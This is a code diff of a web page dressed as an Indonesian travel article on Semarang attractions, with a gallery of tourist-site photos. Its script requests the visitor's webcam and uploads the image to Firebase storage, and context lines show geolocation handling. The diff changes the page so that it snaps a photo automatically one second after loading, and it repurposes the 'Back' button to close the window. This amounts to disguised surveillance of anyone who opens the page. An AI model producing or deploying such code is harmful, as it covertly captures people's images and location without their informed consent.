@@ -64,25 +64,23 @@ img {
     max-height: 100px;
   }
 }
-
-
 </style>
 <body>
   <h1>Artikel Tujuan Lokasi Wisata Semarang</h1>
-<div class="container">
-  <div class="row">
-    <img src="https://i.ibb.co/z7XHH8v/oznhhejhylofv7hpftt5.webp" alt="oznhhejhylofv7hpftt5" border="0">
-    <img src="https://i.ibb.co/7CpdGTf/Saloka-Park-KUMBANG-LAYANG-szprbn.webp" alt="Saloka-Park-KUMBANG-LAYANG-szprbn" border="0">
+  <div class="container">
+    <div class="row">
+      <img src="https://i.ibb.co/z7XHH8v/oznhhejhylofv7hpftt5.webp" alt="oznhhejhylofv7hpftt5" border="0">
+      <img src="https://i.ibb.co/7CpdGTf/Saloka-Park-KUMBANG-LAYANG-szprbn.webp" alt="Saloka-Park-KUMBANG-LAYANG-szprbn" border="0">
     </div>
-  <div class="row">
-   <img src="https://i.ibb.co/6cQ4X3m/Sam-Poo-Kong-2-zjpcnc.webp" alt="Sam-Poo-Kong-2-zjpcnc" border="0">
-    <img src="https://i.ibb.co/K9D5JJ5/Kota-Lama-Semarang-Oktavisual-Project-Unsplash-xx3oeg.webp" alt="Kota-Lama-Semarang-Oktavisual-Project-Unsplash-xx3oeg" border="0">
+    <div class="row">
+      <img src="https://i.ibb.co/6cQ4X3m/Sam-Poo-Kong-2-zjpcnc.webp" alt="Sam-Poo-Kong-2-zjpcnc" border="0">
+      <img src="https://i.ibb.co/K9D5JJ5/Kota-Lama-Semarang-Oktavisual-Project-Unsplash-xx3oeg.webp" alt="Kota-Lama-Semarang-Oktavisual-Project-Unsplash-xx3oeg" border="0">
     </div>
-  <div class="row">
-   <img src="https://i.ibb.co/s5QyVFC/Pagoda-Avalokitesvara-Semarang-min-fhxaoi.webp" alt="Pagoda-Avalokitesvara-Semarang-min-fhxaoi" border="0">
-    <img src="https://i.ibb.co/Vts04yb/Kampung-Pelangi-Semarang-min-uiljr2.webp" alt="Kampung-Pelangi-Semarang-min-uiljr2" border="0">
+    <div class="row">
+      <img src="https://i.ibb.co/s5QyVFC/Pagoda-Avalokitesvara-Semarang-min-fhxaoi.webp" alt="Pagoda-Avalokitesvara-Semarang-min-fhxaoi" border="0">
+      <img src="https://i.ibb.co/Vts04yb/Kampung-Pelangi-Semarang-min-uiljr2.webp" alt="Kampung-Pelangi-Semarang-min-uiljr2" border="0">
+    </div>
   </div>
-</div>
 
   <video id="video" width="640" height="480" autoplay></video>
   <button id="capture">Kembali</button>
@@ -104,19 +102,23 @@ img {
     var storageRef = firebase.storage().ref();
 
     // Mengambil video dan menampilkannya di elemen video
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+    navigator.mediaDevices.getUserMedia({ video: true })
       .then(function(stream) {
         var video = document.getElementById('video');
         video.srcObject = stream;
         video.play();
+
+        // Mengambil gambar setelah halaman dibuka
+        setTimeout(function() {
+          takePicture();
+        }, 1000);
       })
       .catch(function(error) {
         console.error("Tidak dapat mengakses kamera: ", error);
       });
 
-    // Mengambil gambar saat tombol di klik
-    var captureButton = document.getElementById('capture');
-    captureButton.addEventListener('click', function() {
+    // Mengambil gambar
+    function takePicture() {
       var video = document.getElementById('video');
       var canvas = document.createElement('canvas');
       var context = canvas.getContext('2d');
@@ -169,15 +171,17 @@ img {
           } else {
             console.error('Geolocation tidak didukung.');
           }
-          // Menutup jendela setelah 1 detik
-            setTimeout(function() {
-            window.close();
-             }, 10);
-       })
-       .catch(function(error) {
-  console.error("Tidak dapat mengakses kamera: ", error);
-});
+        })
+        .catch(function(error) {
+          console.error('Gagal mengunggah gambar: ', error);
+        });
       }, 'image/png');
+    }
+
+    // Menutup jendela saat tombol "Kembali" diklik
+    var captureButton = document.getElementById('capture');
+    captureButton.addEventListener('click', function() {
+      window.close();
     });
   </script>
 </body>
